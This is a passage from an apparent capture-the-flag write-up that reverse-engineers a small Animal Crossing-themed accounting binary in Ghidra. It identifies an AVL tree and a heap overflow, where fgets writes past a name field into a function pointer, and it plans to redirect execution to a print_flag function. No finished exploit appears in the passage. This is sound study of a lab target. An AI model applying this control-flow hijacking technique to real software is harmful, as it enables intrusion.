    <span class="k">else</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">&lt;=</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">param_1</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">insert</span><span class="p">(</span><span class="n">param_1</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">param_2</span><span class="p">,</span><span class="n">param_3</span><span class="p">);</span>
      <span class="n">param_1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">iVar1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">uVar2</span> <span class="o">=</span> <span class="n">height</span><span class="p">(</span><span class="n">param_1</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="n">uVar3</span> <span class="o">=</span> <span class="n">height</span><span class="p">(</span><span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">uVar3</span><span class="p">,</span><span class="n">uVar2</span><span class="p">);</span>
    <span class="n">param_1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">iVar1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">getBalance</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">param_2</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">param_1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">param_2</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">param_1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">leftRotate</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">&lt;=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">((</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">&lt;</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">param_1</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="p">{</span>
            <span class="n">iVar1</span> <span class="o">=</span> <span class="n">rightRotate</span><span class="p">(</span><span class="n">param_1</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
            <span class="n">param_1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">iVar1</span><span class="p">;</span>
            <span class="n">param_1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">leftRotate</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="n">iVar1</span> <span class="o">=</span> <span class="n">leftRotate</span><span class="p">(</span><span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
          <span class="n">param_1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">iVar1</span><span class="p">;</span>
          <span class="n">param_1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">rightRotate</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">param_1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">rightRotate</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">param_1</span><span class="p">;</span>
<span class="p">}</span>
</pre></td> </tr></tbody></table></code></pre></figure> <p>We see the functions <code class="language-plaintext highlighter-rouge">newNode</code>, <code class="language-plaintext highlighter-rouge">getBalance</code>, <code class="language-plaintext highlighter-rouge">leftRotate</code>, and <code class="language-plaintext highlighter-rouge">rightRotate</code> being used. From our foundational CS classes we know that rotations is a term used to describe the process of balancing binary trees, and <code class="language-plaintext highlighter-rouge">newNode</code> confirms this suspicion. Furthermore, the <code class="language-plaintext highlighter-rouge">left</code> and <code class="language-plaintext highlighter-rouge">right</code> we saw previously makes more sense in the context of trees.</p> <p>Let’s look at <code class="language-plaintext highlighter-rouge">newNode</code>:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr>
<td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td> <td class="code"><pre><span class="n">undefined4</span> <span class="o">*</span> <span class="nf">newNode</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_2</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">__n</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="o">*</span><span class="n">puVar1</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">local_110</span> <span class="p">[</span><span class="mi">256</span><span class="p">];</span>
  <span class="kt">int</span> <span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span>
  <span class="n">puVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x24</span><span class="p">);</span>
  <span class="o">*</span><span class="n">puVar1</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">;</span>
  <span class="n">puVar1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">puVar1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">puVar1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">puVar1</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x80487a6</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">param_2</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">sprintf</span><span class="p">(</span><span class="n">local_110</span><span class="p">,</span>
                        
            <span class="s">"[Isabelle]: Oh no! I cant seem to find what this item is, but it cost %d bells, whatis it?</span><span class="se">\n</span><span class="s">Item: "</span>
            <span class="p">,</span><span class="n">param_1</span><span class="p">);</span>
    <span class="n">fancy_print</span><span class="p">(</span><span class="n">local_110</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">puVar1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">puVar1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">),</span><span class="mh">0x15</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
    <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)((</span><span class="kt">int</span><span class="p">)</span><span class="n">puVar1</span> <span class="o">+</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">fancy_print</span><span class="p">(</span><span class="s">"[Isabelle]: Ohmygosh! Thank you for remembering! Now I can get back to work!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">__n</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">param_2</span><span class="p">);</span>
    <span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">puVar1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">),</span><span class="n">param_2</span><span class="p">,</span><span class="n">__n</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[NookAccounting]: Added </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s"> with cost of %d bells to accounting spreadsheet.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
         <span class="n">puVar1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span><span class="o">*</span><span class="n">puVar1</span><span class="p">);</span>
  <span class="n">usleep</span><span class="p">(</span><span class="mi">100000</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">puVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)</span><span class="n">__stack_chk_fail_local</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">puVar1</span><span class="p">;</span>
<span class="p">}</span>
</pre></td> </tr></tbody></table></code></pre></figure> <p>We see that <code class="language-plaintext highlighter-rouge">puVar</code> is returned from malloc, and afterwards we are setting values to array indices of it. This pattern strongly indicates that <code class="language-plaintext highlighter-rouge">puVar1</code> is a struct with fields which are a multiple of 4 bytes (since Ghidra detected that <code class="language-plaintext highlighter-rouge">puVar1</code> is a <code class="language-plaintext highlighter-rouge">undefined4 *</code>), and that we are setting the fields in the struct.</p> <p><code class="language-plaintext highlighter-rouge">0x80487a6</code> looks like a pointer. If we go to the address in the disassembly, we end up precisely at the <code class="language-plaintext highlighter-rouge">print_edges</code> function, which looks like follows:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr>
<td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td> <td class="code"><pre><span class="kt">void</span> <span class="nf">print_edges</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">undefined4</span> <span class="o">*</span><span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">===Nook(TM) Accounting Very Large Software V 10.49185.2a==="</span><span class="p">);</span>
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">**</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"-=Left=-"</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">local_10</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span><span class="o">*</span><span class="n">local_10</span><span class="p">);</span>
    <span class="n">local_10</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)</span><span class="n">local_10</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"-=Right=-"</span><span class="p">);</span>
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">**</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">local_10</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span><span class="o">*</span><span class="n">local_10</span><span class="p">);</span>
    <span class="n">local_10</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)</span><span class="n">local_10</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"============================================"</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</pre></td> </tr></tbody></table></code></pre></figure> <p>That was what we saw previously at the end when running the program. Also, recall that line 50 in main was calling a function at offset 0x20, while the pointer is being set at offset 8 * 4 = 32 = 0x20 as well, so we can confirm that this function pointer is what is being called at the end. If we could overwrite the function pointer, we have EIP control!</p> <h3 id="finding-the-vulnerability">Finding the Vulnerability</h3> <p>Now back to the disassembly of <code class="language-plaintext highlighter-rouge">newNode</code>. We see a <code class="language-plaintext highlighter-rouge">fgets</code> being performed in line 25. It is writing to <code class="language-plaintext highlighter-rouge">puVar1 + 4</code>, and since <code class="language-plaintext highlighter-rouge">puVar1</code> is a pointer to a 4 byte type, this is a 4 * 4 = 16 bytes offset. So we can read up to 0x15 bytes to <code class="language-plaintext highlighter-rouge">&amp;puVar[4]</code>. However, we only need 0x10 bytes to reach <code class="language-plaintext highlighter-rouge">&amp;puVar[8]</code>, and then we have another 5 bytes overflow which is more than enough to overwrite the function pointer!</p> <p>Now that we have a buffer overflow vulnerability in hand and we can control EIP, let’s see if there are already good existing targets to jump too. We recall that we have the <code class="language-plaintext highlighter-rouge">print_flag</code> function to use. Awesome!</p> <h3 id="developing-the-exploit">Developing the Exploit</h3> <p>We see that the vulnerable code path only gets executed in <code class="language-plaintext highlighter-rouge">newNode</code> when <code class="language-plaintext highlighter-rouge">param_2</code> is NULL. If we trace the code from the caller in main, this corresponds to the third argument for <code class="language-plaintext highlighter-rouge">insert</code>, and it is only in line 23 of <code class="language-plaintext highlighter-rouge">main</code> where it is set to NULL: <code class="language-plaintext highlighter-rouge">local_13c = insert(uVar1,0x19,0);</code>. This means we only get to overwrite the function pointer of one node that has the second parameter (which turns out to be the price) as 0x19, or 25.</p> <p>Also, knowing that the data structure is most likely that of a tree, the disassembly of setting <code class="language-plaintext highlighter-rouge">uVar1</code> again and again makes sense now. <code class="language-plaintext highlighter-rouge">uVar1</code> is basically the root of the tree, and when we insert a node into a tree, we are getting the new root back each time. Then, the function pointer of the last node to be the root is called.</p> <p>I tried to see if we can get lucky by just exploiting the overflow and seeing if the node that has the overflow ended up as the eventual root, but it did not work, as expected.</p> <p>I then began annotating the <code class="language-plaintext highlighter-rouge">insert</code> function, to try to figure out the structure of the tree and see whether that gives us any insights:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr>
<td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre></td> <td class="code"><pre><span class="n">node</span> <span class="o">*</span> <span class="nf">insert</span><span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="n">node</span><span class="p">,</span><span class="kt">int</span> <span class="n">price</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">item_name</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">node</span> <span class="o">*</span><span class="n">child_node</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="n">child_node_</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="n">left_height</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">max_child_height</span><span class="p">;</span>
  
  <span class="n">__x86</span><span class="p">.</span><span class="n">get_pc_thunk</span><span class="p">.</span><span class="n">ax</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">node</span> <span class="o">==</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">node</span> <span class="o">=</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="n">newNode</span><span class="p">(</span><span class="n">price</span><span class="p">,</span><span class="n">item_name</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">price</span> <span class="o">&lt;</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">price</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">child_node</span> <span class="o">=</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="n">insert</span><span class="p">((</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">left</span><span class="p">,</span><span class="n">price</span><span class="p">,</span><span class="n">item_name</span><span class="p">);</span>
      <span class="o">*</span><span class="p">(</span><span class="n">node</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">left</span> <span class="o">=</span> <span class="n">child_node</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
                    <span class="cm">/* if price == node-&gt;price */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">price</span> <span class="o">&lt;=</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">price</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">node</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="n">child_node_</span> <span class="o">=</span> <span class="n">insert</span><span class="p">((</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">right</span><span class="p">,</span><span class="n">price</span><span class="p">,</span><span class="n">item_name</span><span class="p">);</span>
      <span class="n">node</span><span class="o">-&gt;</span><span class="n">right</span> <span class="o">=</span> <span class="n">child_node_</span><span class="p">;</span>
    <span class="p">}</span>
                    <span class="cm">/* variable got repurposed here as an int, since they have the same size */</span>
    <span class="n">child_node_</span> <span class="o">=</span> <span class="n">height</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">right</span><span class="p">);</span>
    <span class="n">left_height</span> <span class="o">=</span> <span class="n">height</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">left</span><span class="p">);</span>
    <span class="n">max_child_height</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="n">left_height</span><span class="p">,</span><span class="n">child_node_</span><span class="p">);</span>
    <span class="n">node</span><span class="o">-&gt;</span><span class="n">height</span> <span class="o">=</span> <span class="n">max_child_height</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
		   <span class="cm">/* The register from max_child_height was reused here, so while I wish I could have
		    * been able to rename this to something more appropriate like "height_diff",
		    * I am stuck with this. If anyone knows of a way to rename this in Ghidra
		    * please do let me know in the comments! */</span>
    <span class="n">max_child_height</span> <span class="o">=</span> <span class="n">getBalance</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">max_child_height</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">left</span> <span class="o">&lt;=</span> <span class="n">price</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">((</span><span class="n">max_child_height</span> <span class="o">&lt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">right</span> <span class="o">&lt;</span> <span class="n">price</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">node</span> <span class="o">=</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="n">leftRotate</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">max_child_height</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">price</span> <span class="o">&lt;=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">left</span><span class="p">))</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">((</span><span class="n">max_child_height</span> <span class="o">&lt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">price</span> <span class="o">&lt;</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">right</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">child_node_</span> <span class="o">=</span> <span class="n">rightRotate</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">right</span><span class="p">);</span>
            <span class="n">node</span><span class="o">-&gt;</span><span class="n">right</span> <span class="o">=</span> <span class="n">child_node_</span><span class="p">;</span>
            <span class="n">node</span> <span class="o">=</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="n">leftRotate</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="n">child_node_</span> <span class="o">=</span> <span class="n">leftRotate</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">left</span><span class="p">);</span>
          <span class="n">node</span><span class="o">-&gt;</span><span class="n">left</span> <span class="o">=</span> <span class="n">child_node_</span><span class="p">;</span>
          <span class="n">node</span> <span class="o">=</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="n">rightRotate</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">node</span> <span class="o">=</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="n">rightRotate</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">node</span><span class="p">;</span>
<span class="p">}</span>
</pre></td> </tr></tbody></table></code></pre></figure> <p>The tree is being sorted by price. <code class="language-plaintext highlighter-rouge">getBalance</code> returns the difference in height between the left and right child. <code class="language-plaintext highlighter-rouge">leftRotate</code> and <code class="language-plaintext highlighter-rouge">rightRotate</code> was a bit involved and I did not bother reversing them, as it is probably what it says it does.</p> <p>While doing so, I also reversed the structure of the node, with the offsets and datatypes given below:</p> <figure> <picture> <source class="responsive-img-srcset" srcset=" /assets/img/screenshots/accounting_accident_node_struct.webp-480.webp 480w, /assets/img/screenshots/accounting_accident_node_struct.webp-800.webp 800w, /assets/img/screenshots/accounting_accident_node_struct.webp-1400.webp 1400w, " sizes="95vw" type="image/webp"></source> <img src="/assets/img/screenshots/accounting_accident_node_struct.webp" class="z-depth-1 center" width="400px" height="auto" style="object-fit: cover" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture><figcaption class="caption"> Reversed node struct </figcaption> </figure> <p>The fields are as we would expect.</p> <h3 id="possibly-an-avl-tree">Possibly an AVL tree?</h3> <p>If we look at the code, we see that a rotation (either left or right) is done when the absolute difference between the heights of the subtrees exceeds 1. This brings back memories from our intro CS class, which introduced the AVL tree that has the property that the “heights of the two child subtrees of any node differ by at most one; if at any time they differ by more than one, rebalancing is done to restore this property”. So we are most likely looking at an AVL tree!</p> <p>Let’s confirm our suspicions, and see the output of the program when we insert nodes of a particular value. Before we do that, let’s reverse <code class="language-plaintext highlighter-rouge">print_edges</code> so we know what exactly is being printed:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr>
<td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td> <td class="code"><pre><span class="kt">void</span> <span class="nf">print_edges</span><span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="n">node</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">node</span> <span class="o">*</span><span class="n">n</span><span class="p">;</span>
  
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">===Nook(TM) Accounting Very Large Software V 10.49185.2a==="</span><span class="p">);</span>
  <span class="n">n</span> <span class="o">=</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">left</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"-=Left=-"</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">n</span> <span class="o">!=</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">n</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="n">n</span><span class="o">-&gt;</span><span class="n">price</span><span class="p">);</span>
    <span class="n">n</span> <span class="o">=</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="n">n</span><span class="o">-&gt;</span><span class="n">left</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"-=Right=-"</span><span class="p">);</span>
  <span class="n">n</span> <span class="o">=</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">right</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">n</span> <span class="o">!=</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">n</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="n">n</span><span class="o">-&gt;</span><span class="n">price</span><span class="p">);</span>
    <span class="n">n</span> <span class="o">=</span> <span class="p">(</span><span class="n">node</span> <span class="o">*</span><span class="p">)</span><span class="n">n</span><span class="o">-&gt;</span><span class="n">right</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"============================================"</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
